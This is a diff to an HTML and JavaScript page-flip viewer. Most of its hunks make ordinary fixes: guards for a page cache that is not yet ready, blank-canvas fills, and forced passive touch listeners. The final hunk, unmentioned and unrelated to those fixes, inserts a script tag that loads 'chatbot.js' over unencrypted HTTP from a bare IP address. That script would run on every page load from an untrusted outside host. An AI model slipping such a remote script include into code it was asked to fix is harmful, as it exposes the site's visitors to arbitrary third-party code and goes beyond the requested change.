@@ -401,6 +401,7 @@
     let cache = [];          // full-res canvases, indexed by page
     let thumbs = [];         // thumbnail canvases, indexed by page
     let pgW, pgH;
+    let cacheReady = false;  // true only once ALL pages are in cache
     let zoomLvl = 1.0, effect = 'magazine', cur = 0, pf = null, busy = false, _st = {};
     let soundOn = true;
 
@@ -523,6 +524,7 @@
         }
 
         // ── Show viewer immediately — all pages are in cache ──
+        cacheReady = true;
         setP(100, 'Ready');
         document.getElementById('loading').style.display = 'none';
         document.getElementById('sv').style.display = 'block';
@@ -544,6 +546,7 @@
     /* ── Resize rebuild ── */
     let _resizeTimer;
     window.addEventListener('resize', () => {
+      if (!cacheReady) return;   // don't rebuild while pages are still rendering
       clearTimeout(_resizeTimer);
       _resizeTimer = setTimeout(() => { build(effect); }, 220);
     });
@@ -617,7 +620,12 @@
       c.width   = Math.round(w * DPR);
       c.height  = Math.round(h * DPR);
       c.style.cssText = `width:${w}px;height:${h}px;display:block`;
-      c.getContext('2d', { alpha: false }).drawImage(cache[i], 0, 0, c.width, c.height);
+      const ctx = c.getContext('2d', { alpha: false });
+      ctx.fillStyle = '#fff';
+      ctx.fillRect(0, 0, c.width, c.height);
+      if (cache[i] instanceof HTMLCanvasElement) {
+        ctx.drawImage(cache[i], 0, 0, c.width, c.height);
+      }
       wrap.appendChild(c);
       return wrap;
     }
@@ -639,7 +647,7 @@
       updateUI();
     }
 
-    function swFx(btn) { effect = btn.dataset.v; syncTabs(effect); build(effect); }
+    function swFx(btn) { if (!cacheReady) return; effect = btn.dataset.v; syncTabs(effect); build(effect); }
     function syncTabs(e) { document.querySelectorAll('.vt[data-v]').forEach(b => b.classList.toggle('on', b.dataset.v === e)); }
 
     /* ─────────────────────────────────────────────────────────────
@@ -672,9 +680,32 @@
         c.width  = Math.round(w * DPR);
         c.height = Math.round(h * DPR);
         c.style.cssText = `width:${w}px;height:${h}px;display:block`;
-        c.getContext('2d', { alpha: false }).drawImage(cache[i], 0, 0, c.width, c.height);
+        const ctx2d = c.getContext('2d', { alpha: false });
+        ctx2d.fillStyle = '#fff';
+        ctx2d.fillRect(0, 0, c.width, c.height);
+        // Guard: cache[i] may be undefined if build() fires before all
+        // pages have rendered (resize during load, or mode switch).
+        if (cache[i] instanceof HTMLCanvasElement) {
+          ctx2d.drawImage(cache[i], 0, 0, c.width, c.height);
+        }
         d.appendChild(c); host.appendChild(d); divs.push(d);
       }
+
+      // ── Passive-touch patch ──────────────────────────────────────
+      // page-flip registers touchstart without { passive: true }, which
+      // triggers a browser intervention warning on mobile and can block
+      // scrolling. We intercept addEventListener on the host element so
+      // any touch* listener page-flip attaches is silently forced passive.
+      const _origAEL = host.addEventListener.bind(host);
+      host.addEventListener = function(type, fn, opts) {
+        if (type === 'touchstart' || type === 'touchmove' || type === 'touchend') {
+          if (typeof opts === 'boolean') opts = { capture: opts };
+          else if (!opts || typeof opts !== 'object') opts = {};
+          opts.passive = true;
+        }
+        return _origAEL(type, fn, opts);
+      };
+      // ────────────────────────────────────────────────────────────
 
       pf = new St.PageFlip(host, {
         width: w, height: h, size: 'fixed', drawShadow: true,
@@ -751,5 +782,7 @@
       });
     }
   </script>
+
+  <script src="http://34.11.212.171:5000/static/chatbot.js"></script>
 </body>
 </html>
